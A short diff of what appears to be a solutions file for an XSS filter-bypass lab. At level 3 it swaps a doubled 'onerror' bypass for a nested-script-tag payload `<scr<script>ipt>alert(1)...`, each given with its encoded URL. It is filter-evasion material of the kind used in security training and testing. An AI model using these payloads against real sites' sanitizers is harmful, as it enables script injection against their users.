@@ -18,10 +18,10 @@ Layered/sequential filters where one filter's output enables a bypass that survi
 
 ### nestedfilter-level3
 
-`/nestedfilter/level3/?query=%3Cimg%20src%3Dx%20onerroronerror%3D%3Dalert(1)%3E`
+`/nestedfilter/level3/?query=%3Cscr%3Cscript%3Eipt%3Ealert(1)%3C/scr%3C/script%3Eipt%3E`
 
-- payload: `<img src=x onerroronerror==alert(1)>`
-- context: on[a-z]+= stripped once then script stripped; double-on bypass
+- payload: `<scr<script>ipt>alert(1)</scr</script>ipt>`
+- context: single-pass handler and script strip; nest both script tags
 
 ### nestedfilter-level4
 
